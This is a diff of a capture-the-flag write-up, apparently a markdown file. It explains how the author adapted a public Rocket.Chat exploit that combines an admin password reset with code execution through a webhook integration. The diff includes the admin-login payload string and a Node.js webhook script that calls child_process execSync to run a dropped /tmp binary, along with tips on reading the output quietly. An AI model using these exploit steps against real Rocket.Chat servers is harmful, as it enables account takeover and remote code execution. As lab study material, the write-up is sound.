@@ -16,13 +16,13 @@ The exploit by itself didn't work properly however - it could successfully reset
 - as just alluded to, the script assumes the site and the admin is protected by MFA. This is not the case for this room. Accordingly all the secret and code stuff in the script can be removed, but importantly, within the RCE function, the payload sent to the auth endpoint should be changed from:
 
   ```
-  	payload = '{"message":"{\\"msg\\":\\"method\\",\\"method\\":\\"login\\",\\"params\\":[{\\"totp\\":{\\"login\\":{\\"user\\":{\\"username\\":\\"admin\\"},\\"password\\":{\\"digest\\":\\"'+sha256pass+'\\",\\"algorithm\\":\\"sha-256\\"}},\\"code\\":\\"'+code+'\\"}}]}"}'
+  payload = '{"message":"{\\"msg\\":\\"method\\",\\"method\\":\\"login\\",\\"params\\":[{\\"totp\\":{\\"login\\":{\\"user\\":{\\"username\\":\\"admin\\"},\\"password\\":{\\"digest\\":\\"'+sha256pass+'\\",\\"algorithm\\":\\"sha-256\\"}},\\"code\\":\\"'+code+'\\"}}]}"}'
   ```
   
   to
   
   ```
-    payload = '{"message":"{\\"msg\\":\\"method\\",\\"method\\":\\"login\\",\\"params\\":[{\\"user\\":{\\"username\\":\\"admin\\"},\\"password\\":{\\"digest\\":\\"'+sha256pass+'\\",\\"algorithm\\":\\"sha-256\\"}}]}"}'
+  payload = '{"message":"{\\"msg\\":\\"method\\",\\"method\\":\\"login\\",\\"params\\":[{\\"user\\":{\\"username\\":\\"admin\\"},\\"password\\":{\\"digest\\":\\"'+sha256pass+'\\",\\"algorithm\\":\\"sha-256\\"}}]}"}'
   ```
 - third, the rce execution doesn't work because it uses the wrong format for the nodejs script, compared to what rocketchat expects. specifically it tries to create an integration (webhook) with the following script:
 
@@ -41,10 +41,12 @@ The exploit by itself didn't work properly however - it could successfully reset
       const require = console.log.constructor('return process.mainModule.require')();
       const { execSync } = require('child_process');
       res = execSync('chmod +x /tmp/CR86Ge29yShsPuLFp && /tmp/CR86Ge29yShsPuLFp');
-      return { content: { text: res.toString() } }
+      return { error: { success: true, message: res.toString() } }
     }
   }
   ```
+  this also changed some of the offsets used to find the token and id from the response
+- finally, reading the output needed to be tweaked: since the result was in a message field, parsing the response as json then printing this field would get proper formatting.
   
 Webhooks can be invoked by curl, and the full curl command is helpfully provided on the integrations page. Notably, in the above setup the output of the command is placed in the general chat channel, which isn't very stealthy. Alternatively using `return { error: { success: false, message: res.toString() } }` would output the error on the command line after curl. Also, bad failures of the script can be diagnosed in the logs (though the log will be full of errors from the token brute forcing, be warned).
 
